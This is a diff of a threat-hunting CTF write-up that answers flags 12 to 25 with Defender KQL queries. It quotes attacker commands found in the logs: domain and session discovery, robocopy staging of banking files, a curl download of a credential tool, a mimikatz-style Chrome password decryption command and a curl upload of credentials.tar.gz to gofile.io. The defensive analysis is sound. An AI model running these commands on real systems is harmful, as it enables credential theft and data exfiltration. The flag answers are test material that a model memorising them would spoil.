@@ -209,5 +209,112 @@ The threat actor encoded another command that was used to elevate privileges to 
 
 ---
 
-## 🚩 Flag 12, 13, 14, 15, 16: DISCOVERY - Session Enumeration
+## 🚩 Flag 12, 13, 14, 15, 16: DISCOVERY - Session Enumeration, Domain Trust Enumeration, Network Connection Enumeration, Password Database Search, Credential File
+
+Answer flag 12: qwinsta.exe
+Answer flag 13: "nltest.exe" /domain_trusts /all_trusts
+Answer flag 14: "NETSTAT.EXE" -ano
+Answer flag 15: where /r C:\Users *.kdbx
+Answer flag 16: OLD-Passwords.txt
+
+Query used: 
+```
+DeviceProcessEvents
+| where DeviceName contains "azuki-adminpc"
+| where AccountName == "yuki.tanaka"
+| project Timestamp, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, AdditionalFields
+```
+
+<img width="1000" height="1000" alt="image" src="https://github.com/user-attachments/assets/be9b311a-cc90-42a6-ab01-ec6d8723dde7" />
+
+I inspected the Process events and filtered for the compromised user, to see the commands made by that profile to find overwhelming evidence of the commands used by the threat actor for session, Domain trust and network connection enumeration. The threat actor then looked for password databases and found what he was looking for, which was the OLD-Passwords.txt document.
+
+---
+
+## 🚩 Flag 17, 18: COLLECTION - Data Staging Directory & Automated Data Collection Command
+
+Answer flag 17: C:\ProgramData\Microsoft\Crypto\staging
+Answer flag 18: "Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP
+
+<img width="900" height="458" alt="image" src="https://github.com/user-attachments/assets/4e3790d1-9338-4580-820e-8f7f56b43105" />
+
+Furthermore, following the previous flags, I found the command where the threat actor copied the whole banking directory into his own staging directory, which answers both flags 17 and 18.
+
+---
+
+## 🚩 Flag 19: COLLECTION - Exfiltration Volume
+
+Answer flag 19: 8
+
+Query used: 
+```
+DeviceFileEvents
+| where FolderPath contains "C:\\ProgramData\\Microsoft\\Crypto\\staging"
+| where FileName !contains ".pdf"
+| where DeviceName contains "azuki-adminpc"
+| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by Timestamp asc
+```
+
+<img width="900" height="608" alt="image" src="https://github.com/user-attachments/assets/8891f50e-0f17-4680-a8dd-6dcf7c07cdca" />
+
+Within the threat actor's staging directory, I found 8 different archive files, filled with sensitive data, all ready to be exfiltrated.
+
+---
+
+## 🚩 Flag 20, 21: CREDENTIAL ACCESS - Credential Theft Tool Download & Browser Credential Theft
+
+Answer flag 20: "curl.exe" -L -o m-temp.7z hxxps[://]litter[.]catbox[.]moe/mt97cj[.]7z
+Answer flag 21: "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit
+
+Query used: 
+```
+DeviceProcessEvents
+| where DeviceName contains "azuki-adminpc"
+| where AccountName == "yuki.tanaka"
+| project Timestamp, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, AdditionalFields
+```
+
+<img width="1000" height="200" alt="image" src="https://github.com/user-attachments/assets/506058a6-cc14-4729-a8fd-c5698c8d311d" />
+
+Two more commands that I noticed in the process events were the download command for the credential theft tool and a command used for browser credential theft.
+
+---
+
+## 🚩 Flag 22, 23: EXFILTRATION - Data Upload Command & Cloud Storage Service
+
+Answer flag 22: "curl.exe" -X POST -F file=@credentials.tar.gz hxxps[://]store1[.]gofile[.]io/uploadFile
+Answer flag 23: gofile[.]io
+
+<img width="900" height="542" alt="image" src="https://github.com/user-attachments/assets/00a21406-f6de-4ae9-a6b9-c9fb4f92b3d6" />
+
+With the same query used as in flag 21, within the process events, I filtered for the POST requests made by the threat actor so I could see what the threat actor exfiltrated and where he exfiltrated to.
+
+---
+
+## 🚩 Flag 24: EXFILTRATION - Destination Server
+
+Answer flag 24: 45.112.123.227
+
+Query used: 
+```
+DeviceNetworkEvents
+| where DeviceName contains "azuki-adminpc"
+| project Timestamp, RemoteIP, RemotePort, ActionType, RemoteUrl, LocalPort, Protocol, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName, InitiatingProcessAccountDomain
+| order by Timestamp asc
+```
+<img width="900" height="794" alt="image" src="https://github.com/user-attachments/assets/30b13253-c751-4db7-9d59-2f06a9a12dff" />
+
+Following the previous results, I checked the network events to find the Remote IP of the exfiltration server / cloud storage service.
+
+---
+
+## 🚩 Flag 25: CREDENTIAL ACCESS - Master Password Extraction
+
+Answer flag 25: KeePass-Master-Password.txt
+
+<img width="900" height="470" alt="image" src="https://github.com/user-attachments/assets/acb7e136-6b46-4eea-a878-3e7e590734d5" />
+
+Another command I previously found in the process events was the command that creates a compressed archive named credentials.tar.gz containing a KeePass database and a text file with its master password.
+
 
